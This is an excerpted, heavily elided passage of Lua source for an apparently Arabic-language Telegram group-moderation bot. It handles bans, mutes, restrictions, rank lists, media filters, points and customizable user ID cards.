send(msg.chat_id_, msg.id_,'☆︙لقد تم تعطيل الطرد والحظر من قبل مالك الكروب')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevALS:sadd(AFS..'ALS:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevALS:sadd(AFS..'ALS:Ban:'..msg.chat_id_, user)
...
DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_, result.id_)
...
DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_, user)
...
if not ALSConstructor(msg) and DevALS:get(AFS.."ALS:Lock:MuteTked"..msg.chat_id_) then 
...
if DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو بالفعل مكتوم من الكروب")  
else
DevALS:sadd(AFS..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","☆︙هو بالفعل مكتوم من الكروب")  
else
DevALS:sadd(AFS..'ALS:Muted:'..msg.chat_id_, result.id_)
...
if DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","☆︙هو بالفعل مكتوم من الكروب")  
else
DevALS:sadd(AFS..'ALS:Muted:'..msg.chat_id_, user)
...
if not DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_, result.id_)
...
if not DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","☆︙هو ليس مكتوم لالغاء كتمه")  
else
DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_, user)
...
DevALS:sadd(AFS..'ALS:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:sadd(AFS..'ALS:Tkeed:'..msg.chat_id_, result.id_)
...
DevALS:sadd(AFS..'ALS:Tkeed:'..msg.chat_id_, user)
...
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_, result.id_)
...
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_, user)
...
if DevALS:sismember(AFS..'ALS:ALSSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(AFS..'ALS:SecondSudo:',result.sender_user_id_) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevALS:sadd(AFS..'ALS:BanAll:', result.sender_user_id_)
text = "☆︙تم حظره عام من المجموعات" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء العام",callback_data=msg.sender_user_id_..":UnAll:"..result.sender_user_id_},{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
...
if DevALS:sismember(AFS..'ALS:ALSSudo:',result.id_) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(AFS..'ALS:SecondSudo:',result.id_) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevALS:sadd(AFS..'ALS:BanAll:', result.id_)
...
if tonumber(user) == tonumber(AFS) then  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if DevALS:sismember(AFS..'ALS:ALSSudo:',user) and not Sudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevALS:sismember(AFS..'ALS:SecondSudo:',user) and not ALSSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevALS:sadd(AFS..'ALS:BanAll:', user)
...
DevALS:sadd(AFS..'ALS:MuteAll:', result.sender_user_id_)          
...
if result.id_ then
DevALS:sadd(AFS..'ALS:MuteAll:', result.id_)
...
DevALS:sadd(AFS..'ALS:MuteAll:', user)
...
DevALS:srem(AFS..'ALS:BanAll:', result.sender_user_id_)
DevALS:srem(AFS..'ALS:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevALS:srem(AFS..'ALS:BanAll:', result.id_)
DevALS:srem(AFS..'ALS:MuteAll:', result.id_)
...
DevALS:srem(AFS..'ALS:BanAll:', user)
DevALS:srem(AFS..'ALS:MuteAll:', user)
...
DevALS:setex(AFS.."ALS:EditDev"..msg.sender_user_id_,300,true)
end
if DevALS:get(AFS.."ALS:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'☆︙تم الغاء امر تغير المطور الاساسي')
DevALS:del(AFS.."ALS:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevALS:del(AFS.."ALS:EditDev"..msg.sender_user_id_)
DevALS:set(AFS.."ALS:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source AFS     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevALS:get(AFS..'ALS:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevALS:sismember(AFS..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙تم رفعه في قائمة المطايه") 
DevALS:sadd(AFS..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source AFS     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevALS:get(AFS..'ALS:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevALS:sismember(AFS..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","☆︙هو ليس مطي ليتم تنزيله") 
else
DevALS:srem(AFS..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:set('AFSTeam:'..AFS..'id:user'..msg.chat_id_,TXT)  
DevALS:setex('AFSTeam:'..AFS.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevALS:del(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevALS:incrby(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevALS:set('AFSTeam:'..AFS..'ids:user'..msg.chat_id_,TXT)  
DevALS:setex('AFSTeam:'..AFS.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevALS:incrby(AFS..'ALS:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevALS:get(AFS..'ALS:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(AFS.."ALS:cleaner"..msg.chat_id_, msg.id_) else DevALS:sadd(AFS.."ALS:cleaner"..msg.chat_id_, msg.id_) end end end
if DevALS:get(AFS..'ALS:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(AFS.."ALS:cleanernum"..msg.chat_id_, msg.id_) else DevALS:sadd(AFS.."ALS:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevALS:get(AFS..'ALS:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevALS:sadd(AFS.."ALS:cleanermusic"..msg.chat_id_, msg.id_) else DevALS:sadd(AFS.."ALS:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevALS:sismember(AFS.."ALS:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevALS:set(AFS..'ALS:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevALS:smembers(AFS..'ALS:VipMem:'..msg.chat_id_)
text = "☆︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..ALS)
text = "☆︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:Managers:'..msg.chat_id_)
text = "☆︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:Cleaner:'..msg.chat_id_)
text = "☆︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:Constructor:'..msg.chat_id_)
text = "☆︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:Owner:'..msg.chat_id_)
text = "☆︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:BasicConstructor:'..msg.chat_id_)
...
local List = DevALS:smembers(AFS..'ALS:Muted:'..msg.chat_id_)
...
local List = DevALS:smembers(AFS..'ALS:Tkeed:'..msg.chat_id_)
text = "☆︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local List = DevALS:smembers(AFS..'ALS:Ban:'..msg.chat_id_)
...
local List = DevALS:smembers(AFS..'User:Donky:'..msg.chat_id_)
...
local List = DevALS:smembers(AFS..'ALS:ALSSudo:')
...
local List = DevALS:smembers(AFS..'ALS:SecondSudo:')
...
local BanAll = DevALS:smembers(AFS..'ALS:BanAll:')
local MuteAll = DevALS:smembers(AFS..'ALS:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevALS:smembers(AFS..'ALS:SudoBot:')
text = "☆︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevALS:get(AFS..'ALS:Sudos'..v) 
local username = DevALS:get(AFS..'Save:UserName'..v)
if username then
...
local UserName = (dp.username_ or "CXRCX")
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم رفع مالك الكروب ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevALS:sadd(AFS.."ALS:ALSConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevALS:srem(AFS.."ALS:FilterSteckr"..msg.chat_id_,idsticker)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevALS:srem(AFS.."ALS:FilterPhoto"..msg.chat_id_,photo)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevALS:srem(AFS.."ALS:FilterAnimation"..msg.chat_id_,idanimation)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Thwel:ALS'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل تحويل الصيغ'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Thwel:ALS'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevALS:get(AFS..'ALS:Thwel:ALS'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevALS:sismember(AFS..'ALS:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(AFS..'ALS:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(AFS..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(AFS..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(AFS..'ALS:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(AFS..'ALS:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevALS:sismember(AFS..'ALS:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(AFS..'ALS:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(AFS..'ALS:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(AFS..'ALS:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(AFS..'ALS:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(AFS..'ALS:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevALS:sismember(AFS..'ALS:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevALS:sismember(AFS..'ALS:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevALS:sismember(AFS..'ALS:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevALS:sismember(AFS..'ALS:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevALS:sismember(AFS..'ALS:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n☆︙عدد الكروبات ↫ '..(DevALS:get(AFS..'ALS:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevALS:sismember(AFS..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevALS:sismember(AFS..'ALS:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevALS:sismember(AFS..'ALS:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevALS:sismember(AFS..'ALS:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevALS:sismember(AFS..'ALS:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevALS:sismember(AFS..'ALS:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevALS:sismember(AFS..'ALS:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevALS:sismember(AFS..'ALS:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevALS:sismember(AFS..'ALS:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الحظر العام ↫ '..banall..'\n☆︙الكتم العام ↫ '..muteall..'\n☆︙الحظر ↫ '..banned..'\n☆︙الكتم ↫ '..muted..'\n☆︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(AFS..'ALS:BanAll:',result.sender_user_id_) DevALS:srem(AFS..'ALS:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,result.sender_user_id_) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,user) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,user) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,user) DevALS:srem(AFS..'ALS:BanAll:',user) DevALS:srem(AFS..'ALS:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,user) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,user) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,result.id_) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,result.id_) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,result.id_) DevALS:srem(AFS..'ALS:BanAll:',result.id_) DevALS:srem(AFS..'ALS:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevALS:srem(AFS..'ALS:Tkeed:'..msg.chat_id_,result.id_) DevALS:srem(AFS..'ALS:Ban:'..msg.chat_id_,result.id_) DevALS:srem(AFS..'ALS:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevALS:set(AFS.."ALS:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevALS:set("AFS:New:id:"..AFS..msg.sender_user_id_,'AFSTeam')
return "AFSTeam"
end
if text and DevALS:get("AFS:New:id:"..AFS..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevALS:del("AFS:New:id:"..AFS..msg.sender_user_id_)
return false
end
DevALS:del("AFS:New:id:"..AFS..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevALS:set(AFS.."ALS:AllIds:Text",text)
return false
end
...
DevALS:del(AFS.."ALS:AllIds:Text")
end
end
--     Source AFS     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙رجائا اتبع التعليمات للتعيين \n☆︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉', 1, 'md')
DevALS:set("AFS:New:id:"..AFS..msg.chat_id_..msg.sender_user_id_,'AFSTeam')
return "AFSTeam"
end
if text and Manager(msg) and DevALS:get("AFS:New:id:"..AFS..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevALS:del("AFS:New:id:"..AFS..msg.chat_id_..msg.sender_user_id_)
return false
end
DevALS:del("AFS:New:id:"..AFS..msg.chat_id_..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ الكليشه الجديده', 1, 'md')
DevALS:set(AFS.."ALS:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف كليشة الايدي")  
DevALS:del(AFS.."ALS:GpIds:Text"..msg.chat_id_)
end
end
--     Source AFS     --
if msg.reply_to_message_id_ ~= 0 then
...
function AFSTeam(extra,ALS,success)
if ALS.username_ then username = '@'..ALS.username_ else username = 'ماكو' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'ماكو' end
local function getpro(extra, ALS, success) 
local msgsday = DevALS:get(AFS..'ALS:UsersMsgs'..AFS..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevALS:get(AFS..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevALS:get(AFS..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevALS:get(AFS..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevALS:get(AFS..'ALS:Lock:Id'..msg.chat_id_) then 
if not DevALS:get(AFS..'ALS:Lock:Id:Photo'..msg.chat_id_) then 
if DevALS:get(AFS.."ALS:AllIds:Text") then
newpicid = DevALS:get(AFS.."ALS:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'ماكو'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'ماكو'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ماكو'))
newpicid = newpicid:gsub('#photos',(ALS.total_count_ or 'ماكو')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'ماكو'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'ماكو'))
newpicid = newpicid:gsub('#cont',(cont or 'ماكو'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'ماكو'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'ماكو'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'ماكو'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'ماكو'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ماكو'))
newpicid = newpicid:gsub('#Description',(Description or 'ماكو'))
else
newpicid = "☆︙"..Description.."\n☆︙معرفك ↫ ❨ "..username.." ❩\n☆︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n☆︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n☆︙رسائلك ↫ ❨ "..user_msgs.." ❩\n☆︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n☆︙تفاعلك ↫ "..formsgs(msguser).."\n☆︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"
end 
if not DevALS:get(AFS.."ALS:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ALS.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevALS:get(AFS.."ALS:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ماكو'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ماكو'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ماكو'))
local new_id = new_id:gsub('#photos',(ALS.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ماكو'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ماكو'))
local new_id = new_id:gsub('#cont',(cont or 'ماكو'))
